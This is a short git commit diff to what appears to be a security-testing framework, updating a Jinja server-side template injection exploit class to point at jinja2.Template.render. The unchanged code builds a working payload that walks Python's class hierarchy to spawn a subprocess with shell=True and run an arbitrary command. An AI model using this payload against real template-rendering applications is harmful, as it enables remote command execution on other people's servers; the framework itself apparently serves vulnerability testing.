7816aca24462ea25c3239c73d969a303c1a06189
Graham Bleaney <gbleaney@fb.com>
2021-04-18 16:37:37 -0400

    Update vulnerable function for Jinja

--- code_execution/server_side_template_code_execution.py
+++ code_execution/server_side_template_code_execution.py
@@ -1,16 +1,16 @@
 from .execution_base import Exploit
+import jinja2
 
 
 class ServerSideTemplateInjectionExploit(Exploit):
     category_name = "Server-Side Template Injection Exploit"
 
 class JinjaTemplateExploit(ServerSideTemplateInjectionExploit):
-    vulnerable_function = "jinja2.Template"
+    vulnerable_function = jinja2.Template.render
     def generate_payload(command: str) -> str:
         # the index of the class can vary!
         return f"{{{{''.__class__.__mro__[1].__subclasses__()[426]('{command}',shell=True,stdout=-1).communicate()}}}}"
 
     def run_payload(payload: str) -> None:
-        import jinja2
         template = jinja2.Template(payload)
         return template.render()
